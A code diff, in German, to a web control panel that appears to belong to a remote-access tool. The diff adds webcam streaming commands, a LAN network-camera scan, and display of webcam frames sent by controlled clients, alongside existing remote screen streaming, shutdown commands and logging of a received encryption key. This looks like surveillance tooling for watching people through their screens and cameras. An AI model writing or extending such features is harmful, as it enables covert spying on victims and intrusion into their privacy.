@@ -665,6 +665,8 @@
         // /screenstream_start und /screenstream_stop UI-Handling
         if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
         if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
+        if (commandText.startsWith("/webcam_start")) handleWebcamCommand("/webcam_start");
+        if (commandText.startsWith("/webcam_stop")) handleWebcamCommand("/webcam_stop");
         let slashPayload = parseSlashCommand(commandText);
         if (slashPayload && slashPayload.action) {
           payload = { target_id: String(selectedClientId), ...slashPayload };
@@ -751,7 +753,10 @@
       { cmd: "/shutdown", desc: "Client herunterfahren" },
       { cmd: "/restart", desc: "Client neustarten" },
       { cmd: "/screenstream_start", desc: "Live-Screen starten" },
-      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
+      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" },
+      { cmd: "/scan_cameras", desc: "Suche nach Netzwerk-Kameras im LAN" },
+      { cmd: "/webcam_start", desc: "Live-Webcam-Stream starten" },
+      { cmd: "/webcam_stop", desc: "Live-Webcam-Stream stoppen" }
     ];
 
     // --- Slash-Befehl Suggestion ---
@@ -845,6 +850,38 @@
           screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
         }
         if (screenStatus) screenStatus.textContent = "";
+      }
+    }
+
+    // --- Webcam Live-Stream UI ---
+    let webcamArea = null;
+    let webcamCanvas = null;
+    let webcamStatus = null;
+    function ensureWebcamArea() {
+      if (!webcamArea) {
+        webcamArea = document.createElement("div");
+        webcamArea.id = "webcam-area";
+        webcamArea.style.display = "none";
+        webcamArea.innerHTML = `
+          <canvas id="webcam-canvas" tabindex="0"></canvas>
+          <div id="webcam-status"></div>
+        `;
+        document.getElementById("main-panel").appendChild(webcamArea);
+        webcamCanvas = webcamArea.querySelector("#webcam-canvas");
+        webcamStatus = webcamArea.querySelector("#webcam-status");
+      }
+    }
+    function handleWebcamCommand(cmd) {
+      ensureWebcamArea();
+      if (cmd === "/webcam_start" || cmd === "webcam_start") {
+        webcamArea.style.display = "";
+        if (webcamStatus) webcamStatus.textContent = "Webcam-Stream wird gestartet...";
+      } else if (cmd === "/webcam_stop" || cmd === "webcam_stop") {
+        webcamArea.style.display = "none";
+        if (webcamCanvas && webcamCanvas.getContext) {
+          webcamCanvas.getContext('2d').clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
+        }
+        if (webcamStatus) webcamStatus.textContent = "";
       }
     }
 
@@ -954,6 +991,28 @@
           img.src = "data:image/jpeg;base64," + data.img_bytes;
         }
         if (screenStatus) screenStatus.textContent = "Live-Bild";
+      } else if (data.action === "webcam_frame") {
+        ensureWebcamArea();
+        if (webcamArea) webcamArea.style.display = "";
+        if (webcamCanvas) {
+          // Nächstes Frame kommt als base64-String im nächsten WS-Frame
+          ws.onmessage = function (event2) {
+            if (typeof event2.data === "string" && event2.data.length > 100) {
+              const img = new window.Image();
+              img.onload = function () {
+                webcamCanvas.width = img.width;
+                webcamCanvas.height = img.height;
+                const ctx = webcamCanvas.getContext("2d");
+                ctx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
+                ctx.drawImage(img, 0, 0, img.width, img.height);
+              };
+              img.src = "data:image/jpeg;base64," + event2.data;
+              if (webcamStatus) webcamStatus.textContent = "Live-Webcam";
+              // Nach Verarbeitung wieder auf Standard setzen
+              ws.onmessage = wsMessageHandler;
+            }
+          };
+        }
       } else if (data.type === "encryption_key") {
         log("Verschlüsselungs-Schlüssel empfangen: " + data.key_hex, "info");
       } else if (data.type === "error") {
@@ -964,6 +1023,13 @@
         // Client-Log anzeigen
         log("[Client] " + (data.msg || ""), data.level || "info");
         debugLog("[Client] " + (data.msg || ""), data.level || "info");
+      } else if (data.type === "webcam_image") {
+        // Webcam-Bild anzeigen
+        const img = document.createElement("img");
+        img.src = "data:image/png;base64," + data.data;
+        img.style.maxWidth = "100%";
+        output.appendChild(img);
+        log("Webcam-Bild empfangen.", "info");
       }
     };
 
